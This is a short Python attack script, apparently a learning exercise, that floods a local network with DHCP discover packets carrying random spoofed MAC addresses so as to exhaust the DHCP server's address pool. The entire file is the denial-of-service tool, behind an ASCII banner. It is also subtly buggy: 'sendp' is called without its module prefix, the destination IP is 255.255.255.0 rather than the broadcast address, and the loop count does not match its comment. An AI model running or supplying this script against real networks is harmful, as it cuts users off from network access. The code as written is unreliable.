import pyfiglet as fg 
import termcolor as cl
text1 = fg.figlet_format(text="DHCP STARVATION", font="slant")
color_text1 = cl.colored(text=text1, color="blue")
text2 = fg.figlet_format(text="BY ID 102", font="small")
color_text2 = cl.colored(text=text2)
print(color_text1)
print(color_text2)
# import the libary and rename it
import scapy.all as sc 
print("1000 dhcp discover packet are being sent...")
# loop 1000 time, sent 1000 dhcp dicover
for i in range(1000 + 1):
    # generate random mac address
    mac_address = sc.RandMAC()
    # create dhcp request packet
    etternet = sc.Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff")  
    ip = sc.IP(src="0.0.0.0", dst="255.255.255.0")  
    udp = sc.UDP(sport=68, dport=67)  
    bootp = sc.BOOTP(op=1, chaddr=mac_address)
    dhcp = sc.DHCP(options=[("message-type", "discover"), ("end")])
    pkt = etternet / ip / udp / bootp / dhcp
    sendp(pkt,iface='eth0', verbose=0)
print("script finish.")
